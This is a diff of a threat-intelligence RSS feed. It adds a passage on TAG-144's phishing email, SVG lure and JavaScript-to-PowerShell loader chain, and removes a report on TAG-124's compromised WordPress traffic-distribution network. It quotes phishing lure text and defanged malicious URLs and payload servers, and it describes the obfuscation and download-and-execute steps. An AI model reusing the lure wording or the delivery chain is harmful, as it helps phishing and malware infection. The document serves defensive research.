+To: undisclosed-recipients:
+Subject: Collection of late payment interest – File 11001-28-05-03004
+
+Caution! This email is from an external user. Do not open attachments or click on links without verifying that the sender and content are secure. Never provide your username or password through links.
+
+A lawsuit has been filed for interest accrued due to late payment.
+See the file for detailed settlement.
+
+Sincerely,
+</code></pre>
+            </div>
+          </div>
+        </div>
+        <p><strong>Figure 7:</strong> Text in phishing email linked to TAG-144 (left) and the English translation (right) (Source: Recorded Future)</p>
+        <h3>SVG Attachment</h3>
+        <p>The email included an attachment named <code>Notificacion_electronica_sentencia_preliminar_Departamento_Juridico_sxyebfiv.svg</code>, which has a SHA256 hash of 04878a5889e3368c2cf093d42006ba18a87c5054f1464900094e6864f4919899. A translated version of the attachment is presented in <strong>Figure 8</strong>, while the original Spanish version is available in <strong>Appendix J</strong>. The SVG content claims that a judicial process has been initiated against the recipient, outlines potential penalties, and contains a link purportedly leading to evidence and further legal details.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_16c20244f94b3a94a124ceda30340c7106200b4b6.png?width=750&amp;format=png&amp;optimize=medium" width="708" height="703" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 8:</strong> Translated SVG file sent via spearphishing email (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <h3>Staging Process Using LIS</h3>
+        <p>The link embedded within the SVG file is:</p>
+        <p><em>hxxps://cdn[.]discordapp[.]com/attachments/1389692690454548634/1389692792590307338/Notificacion_electronica_sentencia_preliminar_Departamento_De-Justicia_01.js?ex=68658bc4&amp;is=68643a44&amp;hm=057a0e76212bdd4c2da95e51ac7542f60ecbd440482ee186d474e1d783afd288&amp;?id=75e6ea37-63e5-491a-a5e2-ad4c92667144</em></p>
+        <p>A similar SVG sample was identified through a Malware Intelligence search for HTTP requests to <em>cdn[.]discordapp[.]com</em> that included “Notificacion” in the query string (see <strong>Figure 9</strong>).</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1feea0cd508cc6db9c03d92e82dd264c69036784a.png?width=750&amp;format=png&amp;optimize=medium" width="1280" height="768" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 9:</strong> Additional sample found in Recorded Future Malware Intelligence (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <p>Although the <em>cdn[.]discordapp[.]com</em> link was inactive at the time of analysis, Insikt Group successfully extracted the downloaded JavaScript file from a PCAP capture. The file, named <code>Notificacion_electronica_sentencia_preliminar_Departamento_De-Justicia_01.js</code>, has the SHA256 hash 1226a8d066328a8b6f353c9d98f1dc8128bd84f3909ae1cc6811dc1adff33c81. The script contains a mix of malicious code and benign content related to the Microsoft Print Schema. The benign portion is displayed in <strong>Figure 10</strong>. The inclusion of benign content is likely an attempt to evade detection.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_12c804eeab005b6d1d0b9552237369e99064b36c9.png?width=750&amp;format=png&amp;optimize=medium" width="1132" height="707" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 10:</strong> Benign code portion contained in the JavaScript script (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <h3>Obfuscation</h3>
+        <p><strong>Figure 11</strong> shows the obfuscated malicious portion of the script. Notably, the code contains comments written in Portuguese, an aspect previously discussed in this report and also associated with activity linked to TAG-144.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_157d1f4291bb406f9bc49a6c6ffc172501a1b5bda.png?width=750&amp;format=png&amp;optimize=medium" width="1126" height="749" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 11:</strong> Obfuscated malicious code portion contained in the JavaScript script (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <p>The variables <code>voicelessness</code> and <code>classe</code>, <code>unwellness</code>, and <code>isostasy</code> are obfuscated using junk characters and later deobfuscated via string replacement operations. These variables resolve to the following:</p>
+        <ul>
+          <li><code>voicelessness</code> and <code>classe</code>: MSXML2.ServerXMLHTTP.6.0</li>
+          <li><code>unwellness</code>: <em>hxxp://paste[.]ee/d/TrxwtHcC/0</em> (as <a href="https://urlscan.io/result/0197fad6-f749-7379-bf1a-533e2f218cc1">observed</a> via URLScan)</li>
+          <li><code>isostasy</code>: GET</li>
+        </ul>
+        <p>The script creates a ServerXMLHTTP object and issues a GET request to the specified <em>paste[.]ee</em> URL using the custom User-Agent <code>MyCustomAgent/1.0</code>. If the HTTP response returns a status code 200, the response body is executed as JavaScript.</p>
+        <p>The SHA256 hash of the response body is 591744244c7ca9cea69cde263187efde3f65a157f8e5eb885ccc1f9e078b5572. This payload contains similar string obfuscation techniques and ultimately reconstructs strings to instantiate a shell object and execute a deobfuscated command line.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1ee4384f6380141fb870f5c0caa709c88e0956bd4.png?width=750&amp;format=png&amp;optimize=medium" width="1013" height="595" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 12:</strong> Obfuscated payload with Portuguese comments (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <h3>PowerShell Script</h3>
+        <p>The deobfuscated command line is shown in <strong>Figure 13</strong>.</p>
+        <div>
+          <div>
+            <div>
+              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_1776451f449e58f97727bbf2b165147421e92bb2d.png?width=750&amp;format=png&amp;optimize=medium" width="1254" height="1116" />
+            </div>
+          </div>
+          <div>
+            <div><strong>Figure 13:</strong> Deobfuscated PowerShell command (Source: Recorded Future)</div>
+          </div>
+        </div>
+        <p>The executed command initiates PowerShell, decodes a Base64-encoded payload, and then runs the decoded content via the Invoke-Expression cmdlet. <strong>Figure 14</strong> shows the deobfuscated string with line breaks added.</p>
+      ]]></content:encoded>
+            <category>Research (Insikt)</category>
+            <enclosure length="0" type="image/jpg" url="https://www.recordedfuture.com/research/media_166e7a5b72f3139807857b88fecc363f8bc7137a0.gif?width=1200&amp;format=pjpg&amp;optimize=medium"/>
+        </item>
         <item>
             <title><![CDATA[Behind the Curtain: How Lumma Affiliates Operate]]></title>
             <link>https://www.recordedfuture.com/research/behind-the-curtain-how-lumma-affiliates-operate</link>
@@ -8106,733 +8416,6 @@ Content-Disposition: form-data; name="ip"
       ]]></content:encoded>
             <category>Blog</category>
             <enclosure length="0" type="image/jpg" url="https://www.recordedfuture.com/blog/media_1e26ca36e126e1189f8d604d800a3ba27b3a99550.png?width=1200&amp;format=pjpg&amp;optimize=medium"/>
-        </item>
-        <item>
-            <title><![CDATA[Multi-Layered TDS Infrastructure Linked to Major Cyber Threats]]></title>
-            <link>https://www.recordedfuture.com/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base</link>
-            <guid isPermaLink="false">https://www.recordedfuture.com/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base</guid>
-            <pubDate>Wed, 21 Jan 1970 02:49:55 GMT</pubDate>
-            <description><![CDATA[Insikt Group has identified TAG-124, a sophisticated traffic distribution system (TDS) linked to Rhysida ransomware, Interlock, SocGholish, and more.]]></description>
-            <content:encoded><![CDATA[
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="insikt-group-logo-updated-3-300x48.png" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
-            </div>
-          </div>
-          <div>
-            <div><em>Analysis cut-off date: January 7, 2025</em></div>
-          </div>
-        </div>
-        <p><em>NOTE: This report was updated on May 12, 2025, after it was discovered that TAG-124 is unrelated to 404TDS. All references to 404TDS as an alias belonging to TAG-124 have been removed.</em></p>
-        <h2>Executive Summary</h2>
-        <p>Insikt Group has identified multi-layered infrastructure linked to a traffic distribution system (TDS) tracked by Recorded Future as TAG-124, which overlaps with threat activity clusters known as LandUpdate808, KongTuke, and Chaya_002. TAG-124 comprises a network of compromised WordPress sites, actor-controlled payload servers, a central server, a suspected management server, an additional panel, and other components. The threat actors behind TAG-124 demonstrate high levels of activity, including regularly updating URLs embedded in the compromised WordPress sites, adding servers, refining TDS logic to evade detection, and adapting infection tactics, as demonstrated by their recent implementation of the ClickFix technique.</p>
-        <p>Insikt Group identified multiple threat actors using TAG-124 within their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others. Notably, the shared use of TAG-124 reinforces the <a href="https://blog.talosintelligence.com/emerging-interlock-ransomware/">connection</a> between Rhysida and Interlock ransomware, which are already linked through similarities in tactics, tools, encryption behaviors, ransom note themes, code overlaps, and data exfiltration techniques. Insikt Group expects that TAG-124 will continue its operations within the increasingly sophisticated and specialized cybercriminal ecosystem, enhance its effectiveness, and attract additional users and partners.</p>
-        <h2>Key Findings</h2>
-        <ul>
-          <li>Insikt Group identified multi-layered infrastructure linked to a TDS tracked as TAG-124. This infrastructure includes a network of compromised WordPress sites, likely actor-controlled payload servers, a central server, a suspected management server, and an additional panel, among other components.</li>
-          <li>The threat actor(s) associated with TAG-124 appear highly active, regularly updating URLs on compromised WordPress sites to evade detection, adding new servers to their infrastructure, and improving TDS-linked conditional logic and infection tactics.</li>
-          <li>Multiple threat actors are assessed to incorporate TAG-124’s service into their initial infection chains, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, TA582, and others.</li>
-          <li>While Rhysida and Interlock ransomware have been associated with each other due to similarities in tactics, tools, encryption behaviors, ransom note themes, overlaps in code, and data exfiltration techniques, the shared use of TAG-124 reinforces this connection.</li>
-        </ul>
-        <h2>Background</h2>
-        <p>TAG-124, which overlaps with LandUpdate808, KongTuke, and Chaya_002, is a TDS used to distribute malware on behalf of various threat actors, including operators of Rhysida ransomware, Interlock ransomware, TA866/Asylum Ambuscade, SocGholish, D3F@CK Loader, and TA582, among others (<a href="https://malasada.tech/the-landupdate808-fake-update-variant/">1</a>, <a href="https://x.com/GroupIB_TI/status/1790230870684828047">2</a>, <a href="https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/">3</a>). A TDS typically <a href="https://www.ncsc.gov.uk/files/White-paper-Ransomware-extortion-and-the-cyber-crime-ecosystem.pdf">refers</a> to a system used to analyze and redirect web traffic based on parameters like geolocation or device type, funneling only specific visitors to malicious destinations such as phishing sites, malware, or exploit kits, while evading detection and optimizing cybercriminal campaigns.</p>
-        <p>More specifically, TAG-124 operates by injecting malicious JavaScript code into compromised WordPress websites. When visitors access an infected website, they unknowingly load attacker-controlled resources designed to manipulate them into completing actions that result in the download and execution of malware. TAG-124 often deceives victims by presenting the malware as a required Google Chrome browser update.</p>
-        <p>In more recent variations, TAG-124 has been <a href="https://malasada.tech/updated-landupdate808-analysis/">observed</a> using the ClickFix technique. This approach displays a dialog instructing visitors to execute a command pre-copied to their clipboard. Once a visitor runs the command, it initiates a multi-stage process that downloads and executes the malware payload.</p>
-        <h2>Threat Analysis</h2>
-        <h3>TAG-124</h3>
-        <p>Insikt Group identified multi-layered infrastructure associated with the TDS TAG-124. This infrastructure comprises a network of compromised WordPress sites, likely actor-controlled payload servers, a central server whose exact purpose remains unclear at the time of analysis, a suspected management server, and an additional management panel. If visitors fulfill specific criteria, the compromised WordPress websites display fake Google Chrome update landing pages, which ultimately lead to malware infections as discussed in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.gfx3d1cfkcni">Users of TAG-124</a> section of this report (see <strong>Figure 1</strong>).</p>
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="TAG-124’s high-level infrastructure setup" src="https://www.recordedfuture.com/media_1a29a34307c115995bfe10442554b6af8207f0f89.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="980" />
-            </div>
-          </div>
-          <div>
-            <div><strong><em>Figure 1</em></strong><em>: TAG-124’s high-level infrastructure setup (Source: Recorded Future)</em></div>
-          </div>
-        </div>
-        <h4>Compromised WordPress Websites</h4>
-        <p>TAG-124’s infrastructure consists of an extensive network of WordPress websites (see <strong>Appendix A</strong>). These websites appear to lack a consistent theme regarding industry, topic, or geography, suggesting they were likely compromised opportunistically through exploits or by acquiring credentials, such as those obtained via infostealers.</p>
-        <h5>First-Stage WordPress Websites in Initial Delivery</h5>
-        <p>The compromised websites of the first stage in the initial delivery phase typically include a script tag with an async attribute at an arbitrary location in the document object model (DOM), enabling the loading of an external JavaScript file in parallel with the page to avoid rendering delays (see <strong>Figure 2</strong>).</p>
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="Script tag in DOM used to load external JavaScript file" src="https://www.recordedfuture.com/media_14d76df3a13a589e6b0580eb03c41480ad4bf376c.png?width=750&amp;format=png&amp;optimize=medium" width="731" height="43" />
-            </div>
-          </div>
-          <div>
-            <div><strong><em>Figure 2</em></strong><em>: Script tag in DOM used to load external JavaScript file (Source:</em> <em><a href="https://urlscan.io/result/eaa33803-1435-44c9-949f-3d707f51da4a">URLScan</a>)</em></div>
-          </div>
-        </div>
-        <p>The JavaScript filename has changed frequently over time, with earlier names following recognizable patterns (such as metrics.js) and more recent ones <a href="https://threatfox.abuse.ch/ioc/1353344/">appearing</a> to be randomly formatted (such as hpms1989.js). Example filenames include:</p>
-        <ul>
-          <li>3561.js</li>
-          <li>365h.js</li>
-          <li>e365r.js</li>
-          <li>hpms1989.js</li>
-          <li>metrics.js</li>
-          <li>nazvanie.js</li>
-          <li>web-analyzer.js</li>
-          <li>web-metrics.js</li>
-          <li>web.js</li>
-          <li>wp-config.js</li>
-          <li>wp.js</li>
-        </ul>
-        <p>Notably, the threat actors appear to be regularly updating the URLs on the compromised websites. For instance, the website associated with <em>www[.]ecowas[.]int</em> has consistently changed the URL used to fetch the JavaScript file. This behavior indicates that the threat actors maintain ongoing access to these WordPress sites and frequently alter the URLs, including the domain and JavaScript filename, likely to evade detection.</p>
-        <p>Although many of the compromised WordPress websites appear to be associated with lesser-known organizations, Insikt Group identified notable cases, including a subdomain linked to the Polish Centre for Testing and Certification, <em>www[.]pcbc[.]gov[.]pl</em>, and the domain of the Economic Community of West African States (ECOWAS) (<em>www[.]ecowas[.]int</em>). Both have been compromised and used in TAG-124 campaigns.</p>
-        <h5>Final Stage WordPress Websites in Initial Delivery</h5>
-        <p>If visitors meet specific criteria, which could not be fully determined, the compromised WordPress domains typically present fake Google Chrome update landing pages. These pages prompt users to click a download button, triggering the download of the actual payload from designated endpoints on a secondary set of compromised WordPress websites, including but likely not limited to:</p>
-        <ul>
-          <li>/wp-admin/images/wfgth.php</li>
-          <li>/wp-includes/pomo/update.php</li>
-          <li>/wp-content/upgrade/update.php</li>
-          <li>/wp-admin/images/rsggj.php</li>
-        </ul>
-        <h5>Fake Google Chrome Update Landing Pages</h5>
-        <p>Insikt Group discovered two variants of fake Google Chrome update landing pages associated with TAG-124 (see <strong>Figure 3</strong>). According to URLScan submission data, Variant 1 has been active longer, with its earliest submission recorded on April 24, 2024.</p>
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="Fake Google Chrome update variant 1 (left) and 2 (right)" src="https://www.recordedfuture.com/media_198b4fda88be52fcde06009d8880f6522a3a20a8a.png?width=750&amp;format=png&amp;optimize=medium" width="688" height="209" />
-            </div>
-          </div>
-          <div>
-            <div><strong><em>Figure 3</em></strong><em>: Fake Google Chrome update variant 1 (left) and 2 (right) (Source:</em> <em><a href="https://urlscan.io/result/fe2ed819-76f1-4a9e-a313-5a8ebcf5f05a/dom">URLScan</a>,</em> <em><a href="https://urlscan.io/result/1f65a245-131e-4cbf-b0d7-b6055b361eaa">URLScan</a>)</em></div>
-          </div>
-        </div>
-        <p>Only victims meeting a specific set of still unknown conditions are directed to the fake Google Chrome update landing page, resulting in the observation of only a limited number of domains (see <strong>Table 1</strong>). These domains can be attributed to TAG-124 based on the URLs embedded in the DOM, public reporting, or other indicators. Notably, the threat actors consistently <a href="https://urlscan.io/result/9cd82562-c413-42e3-bb9a-23ca696c610e/dom">misspell</a> the word “referer” as “refferer” in the query parameter, a typographical error <a href="https://www.forescout.com/blog/sly-malware-found-in-fake-google-chrome-and-ms-teams-installers/">observed</a> in earlier reports.</p>
-        <div>
-          <div>
-            <div>Domain</div>
-            <div>Notes</div>
-            <div>Variant</div>
-          </div>
-          <div>
-            <div>www[.]reloadinternet[.]com</div>
-            <div>Linked to <em>www[.]netzwerkreklame[.]de</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>selectmotors[.]net</div>
-            <div>Linked to <em>www[.]netzwerkreklame[.]de</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>mgssoft[.]com</div>
-            <div>Linked to <em>www[.]netzwerkreklame[.]de</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>www[.]lovebscott[.]com</div>
-            <div>Linked to <em>sustaincharlotte[.]org</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>evolverangesolutions[.]com</div>
-            <div>Linked to <em>sustaincharlotte[.]org</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>www[.]ecowas[.]int</div>
-            <div>Linked to <em>www[.]pawrestling[.]net</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>ns1[.]webasatir[.]ir</div>
-            <div><a href="https://app.any.run/tasks/eefc1d19-08d4-47a4-bfe9-91bbcf9657fb">Linked</a>to <em>true-blood[.]net</em>, which has been previously associated with TAG-124</div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>avayehazar[.]ir</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>cvqrcode[.]lpmglobalrelations[.]com</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>mktgads[.]com</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>incalzireivar[.]ro</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>gmdva[.]org</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>www[.]de[.]digitaalkantoor[.]online</div>
-            <div>Linked to <em>true-blood[.]net</em></div>
-            <div>2</div>
-          </div>
-          <div>
-            <div>elamoto[.]com</div>
-            <div><a href="https://x.com/GroupIB_TI/status/1790230873285242992">Linked</a>to TAG-124 and has the typographical error in the query parameter; it was redirected from <em>winworld[.]es</em>, a domain associated with Spain-based WinWorld, a company specializing in computer support and services</div>
-            <div>2</div>
-          </div>
-        </div>
-        <p><strong><em>Table 1</em></strong><em>: Likely compromised websites hosting fake Google Chrome update pages (Source: Recorded Future)</em></p>
-        <h5>Likely Threat Actor-Owned Domain</h5>
-        <p>While the domains listed in <strong>Table 1</strong> are likely compromised, Insikt Group analyzed URLs present on websites hosted on two additional domains (see <strong>Table 2</strong>). Our analysis suggests these domains are highly likely connected to TAG-124.</p>
-        <div>
-          <div>
-            <div>Domain</div>
-            <div>Notes</div>
-            <div>Variant</div>
-          </div>
-          <div>
-            <div>update-chronne[.]com</div>
-            <div><a href="https://urlscan.io/result/c358f44b-07f9-465a-82a9-acf03243bf01/dom">Contained</a>link to <em>true-blood[.]net</em></div>
-            <div>1</div>
-          </div>
-          <div>
-            <div>sollishealth[.]com</div>
-            <div><a href="https://urlscan.io/result/c358f44b-07f9-465a-82a9-acf03243bf01/dom">Contained</a>links to <em>edveha[.]com</em> and <em>espumadesign[.]com</em>; both were previously associated with TAG-124</div>
-            <div>2</div>
-          </div>
-        </div>
-        <p><strong><em>Table 2</em></strong><em>: Additional domains found via visual similarity search (Source: Recorded Future)</em></p>
-        <p>The domain update-chronne[.]com, hosted behind Cloudflare, appears to be owned by the threat actors as it directly impersonates Google Chrome (see <strong>Figure 4</strong>). At the time of analysis, the domain was still active, indexed by Google Search, and hosted the file Release.zip, which was <a href="https://pro.urlscan.io/result/6cab995d-f9ac-4bf4-81fb-9286825ce9db">identified</a> as REMCOS RAT.</p>
-        <p>
-          <img loading="lazy" alt="Google Chrome fake update landing page" src="https://www.recordedfuture.com/media_14f4f6118f5b11ab7b2b78ab8b9d0144f3adc7322.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="900" /> <strong>Figure 4</strong>: Google Chrome fake update landing page on update-chronne[.]com (Source: Recorded Future)
-        </p>
-        <p>Notably, when a victim clicks the “Update Chrome” button, the website redirects to <em>downloading[.]bplnetempresas[.]com</em>, which shows the IP address <em>146.70.41[.]191</em> combined with three different ports (see <strong>Figure 5</strong>). This IP address has previously been <a href="https://threatfox.abuse.ch/ioc/1331058/">associated</a> with REMCOS RAT.</p>
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="Suspected REMCOS RAT" src="https://www.recordedfuture.com/media_1a7710becbcb3d5f581460e560eee2332a770f122.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="901" />
-            </div>
-          </div>
-          <div>
-            <div><strong><em>Figure 5</em></strong><em>: Suspected REMCOS RAT command-and-control (C2) server shown on downloading[.]bplnetempresas[.]com (Source: Recorded Future)</em></div>
-          </div>
-        </div>
-        <p>Additionally, the domain hosted a file named moc.txt, containing a PowerShell script designed to download and execute the contents of Release.zip (see <strong>Figure 6</strong>). The URL was redirected via the shortened URL <em><a href="https://wl%5B.%5Dgl/25dW64">https://wl[.]gl/25dW64</a></em>.</p>
-        <p>
-          <img loading="lazy" alt="PowerShell script" src="https://www.recordedfuture.com/media_18ad930fb1f781639d4db97515c5afd852d0a4c54.png?width=750&amp;format=png&amp;optimize=medium" width="726" height="147" /> <strong>Figure 6</strong>: PowerShell script hosted on <a href="https://update-chronne%5B.%5Dcom/moc.txt">https://update-chronne[.]com/moc.txt</a> as of September 12, 2024 (Source: <a href="https://urlscan.io/result/87fbb129-b620-4b72-a56d-17c7436de545/dom">URLScan</a>)
-        </p>
-        <h5>Suspected Shell Website</h5>
-        <p>Both <em>update-chronne[.]com</em> and <em>downloading[.]bplnetempresas[.]com</em> hosted a website seemingly associated with "YSOFEL", which appears to be a Brazilian organization (see <strong>Figure 7</strong>). However, no information about this organization could be found online, indicating that it is likely a fictitious entity.</p>
-        <div>
-          <div>
-            <div>
-              <img loading="lazy" alt="Suspected shell website" src="https://www.recordedfuture.com/media_134a48c52afecdb42a72c987cc8a2a75064350d80.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1200" />
-            </div>
-          </div>
-          <div>
-            <div><strong><em>Figure 7</em></strong><em>: Suspected shell website linked to a fake Brazilian organization (Source:</em> <em><a href="https://urlscan.io/result/5b502c49-a255-4639-9db0-7d3cb65731da">URLScan</a>)</em></div>
-          </div>
-        </div>
-        <p>Insikt Group identified several other domains, some of which are noted in the <a href="https://docs.google.com/document/d/1sWVPIS7aEW2Z8Mva1mmWB2auMGlWKGfmUggwZVKuL88/edit?tab=t.0#heading=h.b0ml5ohdkzhk">Compromised WordPress Websites</a> section (such as mktgads[.]com), while others appear to impersonate Google (such as <em>check-googlle[.]com</em>) (see <strong>Table 3</strong>). This suggests that the website may function as a "shell website", potentially used to age domains or to display content only when visitors meet specific criteria.</p>
-        <div>
-          <div>
-            <div>Domain</div>
-            <div>IP Address</div>
-            <div>First Seen</div>
-            <div>Last Seen</div>
-            <div>Notes</div>
-          </div>
-          <div>
-            <div>challinksch[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-09-05</div>
-            <div>2025-01-05</div>
-            <div>Hosted PowerShell script to download PuTTY and linked to AsyncRAT</div>
-          </div>
-          <div>
-            <div>chalnlizt[.]org</div>
-            <div>Cloudflare</div>
-            <div>2024-08-21</div>
-            <div>2025-01-07</div>
-            <div>Hosted PowerShell script</div>
-          </div>
-          <div>
-            <div>check-googlle[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-09-09</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>cihainlst[.]org</div>
-            <div>Cloudflare</div>
-            <div>2024-08-21</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>io-suite-web[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-14</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>miner-tolken[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-09-06</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>ronnin-v2[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-05-27</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symdilatic[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-20</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symbieitc[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-21</div>
-            <div>2025-01-04</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symdlotic[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-21</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>synbioltic[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-21</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symbliatc[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-20</div>
-            <div>2024-12-30</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symbietic[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-19</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>comteste[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-19</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>symdilotic[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-08-20</div>
-            <div>2024-12-30</div>
-            <div>N/A</div>
-          </div>
-          <div>
-            <div>v2-rubby[.]com</div>
-            <div>Cloudflare</div>
-            <div>2024-05-22</div>
-            <div>2025-01-07</div>
-            <div>N/A</div>
-          </div>
-        </div>
-        <p><strong><em>Table 3</em></strong><em>: Domains linked to the same suspected “shell website” linked to the fake Brazilian organization referenced above (Source: Recorded Future)</em></p>
-        <p>It remains uncertain whether all the domains in <strong>Table 3</strong> are malicious or connected to the same activity. However, their shared hosting of the same website, impersonation of other brands (such as ChainList), and partial verification of links to infections make them, at the very least, suspicious.</p>
-        <h5>TAG-124 Delivery Servers</h5>
-        <p>TAG-124 leverages compromised WordPress websites for various components of its infection chains. The servers embedded in the DOMs of these compromised first-stage WordPress sites, as detailed in the First-Stage WordPress Websites in Initial Delivery section, are likely owned by the threat actors. Insikt Group identified a significant network of servers connected to and likely controlled by the TAG-124 threat actors (see <strong>Table 4</strong>).</p>
-        <div>
-          <div>
-            <div>Domain</div>
-            <div>IP Address</div>
-            <div>First Seen</div>
-            <div>Last Seen</div>
-          </div>
-          <div>
-            <div>ambiwa[.]com</div>
-            <div>45[.]61[.]136[.]9</div>
-            <div>2024-12-28</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>gcafin[.]com</div>
-            <div>45[.]61[.]136[.]9</div>
-            <div>2024-12-29</div>
-            <div>2025-01-06</div>
-          </div>
-          <div>
-            <div>discoves[.]com</div>
-            <div>45[.]61[.]136[.]9</div>
-            <div>2024-12-26</div>
-            <div>2025-01-06</div>
-          </div>
-          <div>
-            <div>xaides[.]com</div>
-            <div>45[.]61[.]136[.]40</div>
-            <div>2025-01-02</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>usbkits[.]com</div>
-            <div>45[.]61[.]136[.]40</div>
-            <div>2025-01-02</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>mirugby[.]com</div>
-            <div>45[.]61[.]136[.]40</div>
-            <div>2025-01-02</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>ecrut[.]com</div>
-            <div>45[.]61[.]136[.]41</div>
-            <div>2025-01-06</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>pursyst[.]com</div>
-            <div>45[.]61[.]136[.]41</div>
-            <div>2025-01-06</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>pushcg[.]com</div>
-            <div>45[.]61[.]136[.]67</div>
-            <div>2024-09-18</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>piedsmontlaw[.]com</div>
-            <div>45[.]61[.]136[.]67</div>
-            <div>2022-12-22</div>
-            <div>2025-01-06</div>
-          </div>
-          <div>
-            <div>pemalite[.]com</div>
-            <div>45[.]61[.]136[.]67</div>
-            <div>2022-12-22</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>howmanychairs[.]com</div>
-            <div>45[.]61[.]136[.]67</div>
-            <div>2024-03-14</div>
-            <div>2025-01-06</div>
-          </div>
-          <div>
-            <div>calbbs[.]com</div>
-            <div>45[.]61[.]136[.]89</div>
-            <div>2024-12-18</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>habfan[.]com</div>
-            <div>45[.]61[.]136[.]132</div>
-            <div>2024-12-07</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>iognews[.]com</div>
-            <div>45[.]61[.]136[.]132</div>
-            <div>2024-12-06</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>safigdata[.]com</div>
-            <div>45[.]61[.]136[.]196</div>
-            <div>2024-11-19</div>
-            <div>2025-01-07</div>
-          </div>
-          <div>
-            <div>nyciot[.]com</div>
